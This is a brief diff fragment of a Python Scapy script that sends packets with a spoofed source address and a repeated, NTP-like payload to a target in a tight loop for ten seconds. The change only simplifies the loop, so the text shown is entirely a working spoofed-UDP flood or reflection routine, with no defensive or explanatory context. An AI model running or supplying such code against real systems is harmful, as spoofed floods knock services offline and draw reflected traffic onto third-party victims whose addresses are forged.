@@ -9,6 +9,5 @@ E= "\x1b\x00\x03\x2a" * 12
 
 start = time.time()
 while (time.time() - start < 10):
-    for i in range(0,len(query_type)):
-        spoofed_packet = IP(src=A, dst=B) / UDP(sport=C, dport=D) / E
-        send(spoofed_packet)
+    spoofed_packet = IP(src=A, dst=B) / UDP(sport=C, dport=D) / E
+    send(spoofed_packet)
